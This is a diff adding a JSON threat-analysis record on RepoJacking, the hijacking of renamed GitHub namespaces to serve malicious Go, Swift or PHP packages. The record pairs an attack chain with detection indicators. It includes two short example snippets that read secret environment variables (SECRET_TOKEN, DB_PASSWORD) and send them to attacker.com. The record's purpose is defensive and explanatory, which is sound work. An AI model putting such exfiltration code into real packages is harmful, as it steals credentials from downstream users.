@@ -1,0 +1,112 @@
+{
+  "package_info": {
+    "package_name": "N/A (RepoJacking is a technique, not a specific package)",
+    "package_manager": "Go, Swift, Packagist (and any GitHub-based package manager)",
+    "package_versions": "All versions of packages whose repositories were vulnerable to RepoJacking via username rename",
+    "why_malicious": "The entire package becomes malicious when an attacker hijacks its repository namespace via RepoJacking, allowing them to serve arbitrary, potentially malicious code to all downstream users and dependencies. This enables attackers to inject code that can steal credentials, exfiltrate sensitive data, or compromise build and runtime environments."
+  },
+  "malicious_snippets": [
+    {
+      "snippet_id": "snippet_1",
+      "execution_context": {
+        "trigger": "repository hijack (RepoJacking) via namespace takeover; code executes when the hijacked package is imported or run",
+        "file_location": "entire repository (attacker-controlled repo at hijacked namespace), typically in main.go or equivalent entrypoint",
+        "required_permissions": [
+          "repository write access (to upload malicious code)",
+          "package publishing (to distribute the hijacked package)",
+          "network (to exfiltrate data)",
+          "filesystem (to access environment variables and secrets)"
+        ]
+      },
+      "code_snippet": "// Example: Attacker adds malicious code to the hijacked repo\npackage main\nimport \"os\"\nimport \"net/http\"\nimport \"strings\"\nfunc main() {\n  token := os.Getenv(\"SECRET_TOKEN\")\n  http.Post(\"https://attacker.com/exfil\", \"application/text\", strings.NewReader(token))\n}",
+      "code_language": "go",
+      "code_behavior": "Upon import or execution after a repository hijack, the code accesses the SECRET_TOKEN environment variable, sends its value via HTTP POST to a hardcoded attacker-controlled domain, resulting in credential exfiltration.",
+      "malice_analysis": {
+        "why_suspicious": "The code programmatically accesses sensitive environment variables and transmits their contents to an external, attacker-controlled server, which is a clear indicator of credential theft.",
+        "violated_expectations": "Legitimate package code should not access secrets or transmit sensitive data to untrusted domains without explicit user consent. Such behavior is outside the norm for open source packages.",
+        "similar_legitimate_use": "Some telemetry or error reporting libraries may send anonymized, non-sensitive data to trusted vendor domains, but they do not access or exfiltrate secrets like environment variables.",
+        "key_indicators": [
+          "Access to environment variables containing secrets (e.g., SECRET_TOKEN)",
+          "Outbound HTTP requests to hardcoded, untrusted domains",
+          "Malicious code committed after repository namespace takeover",
+          "Use of standard library functions for network exfiltration (e.g., http.Post)"
+        ]
+      }
+    },
+    {
+      "snippet_id": "snippet_2",
+      "execution_context": {
+        "trigger": "package installation or build (runtime or import-time); code executes when the hijacked package is installed or run",
+        "file_location": "setup.php / main.go / main.swift (entrypoint of hijacked package, depending on language ecosystem)",
+        "required_permissions": [
+          "network (to exfiltrate data)",
+          "filesystem (to read environment variables and write temporary files)"
+        ]
+      },
+      "code_snippet": "<?php\nfile_put_contents('/tmp/creds.txt', getenv('DB_PASSWORD'));\nfile_get_contents('https://attacker.com/collect?data=' . urlencode(file_get_contents('/tmp/creds.txt')));\n?>",
+      "code_language": "php",
+      "code_behavior": "At installation or runtime, the code reads the DB_PASSWORD environment variable, writes it to a temporary file, and exfiltrates the contents to an attacker-controlled domain via an HTTP GET request, resulting in credential theft.",
+      "malice_analysis": {
+        "why_suspicious": "The code collects sensitive credentials from environment variables, stores them locally, and then sends them to an external server controlled by the attacker. This is a direct violation of user trust and a hallmark of malicious activity.",
+        "violated_expectations": "Legitimate packages should never access or exfiltrate user credentials, especially without user knowledge or consent. Writing secrets to disk and transmitting them externally is not standard practice.",
+        "similar_legitimate_use": "Debugging or support tools may collect logs or non-sensitive diagnostic data, but they do not access or transmit secrets, and always require explicit user consent for any data collection.",
+        "key_indicators": [
+          "Access to sensitive environment variables (e.g., DB_PASSWORD)",
+          "Writing secrets to temporary files (e.g., /tmp/creds.txt)",
+          "Network exfiltration to attacker-controlled domains via HTTP requests",
+          "Malicious code inserted after repository hijack"
+        ]
+      }
+    }
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "action": "Attacker registers a previously used (now available) GitHub username matching a popular package's original owner.",
+      "implemented_by": [],
+      "leads_to": "Ability to create a repository with the same namespace as the original package."
+    },
+    {
+      "step": 2,
+      "action": "Attacker creates a repository with the same name as the original under the hijacked username.",
+      "implemented_by": [],
+      "leads_to": "Hijacked namespace now points to attacker's repository."
+    },
+    {
+      "step": 3,
+      "action": "Attacker adds malicious code to the hijacked repository (e.g., credential exfiltration, backdoors).",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Malicious code is now distributed to all users who depend on the package."
+    },
+    {
+      "step": 4,
+      "action": "Downstream users or CI/CD systems install or import the package, executing the malicious code.",
+      "implemented_by": [
+        "snippet_1",
+        "snippet_2"
+      ],
+      "leads_to": "Exfiltration of secrets, compromise of developer or production environments."
+    }
+  ],
+  "detection_knowledge": {
+    "behavioral_signatures": [
+      "Sudden change in repository ownership or namespace for popular packages",
+      "Addition of code that accesses environment variables or secrets after a namespace or maintainer change",
+      "Outbound network requests to untrusted or hardcoded domains from package code",
+      "Unexpected changes in package maintainer or repository URL, especially for widely used packages"
+    ],
+    "file_indicators": [
+      "New or modified entrypoint files (e.g., main.go, setup.php, main.swift) after a namespace or maintainer change",
+      "Code accessing environment variables or writing secrets to temporary files (e.g., /tmp/creds.txt)",
+      "References to external, attacker-controlled domains in code (e.g., attacker.com/exfil, attacker.com/collect)"
+    ],
+    "network_indicators": [
+      "HTTP/HTTPS requests to attacker-controlled or previously unseen domains (e.g., attacker.com)",
+      "Unusual outbound traffic from build or CI/CD environments to external IPs/domains not previously associated with the package"
+    ],
+    "how_to_detect": "Monitor for changes in package repository ownership or namespace, especially for popular or widely depended-upon packages. Flag packages whose codebase changes significantly after a namespace or maintainer change, particularly if new code accesses environment variables or makes outbound network requests to untrusted domains. Scan for hardcoded references to external domains in entrypoint files. Alert on installation or import of packages from recently hijacked namespaces, and monitor for exfiltration attempts from build or runtime environments to previously unseen domains."
+  }
+}
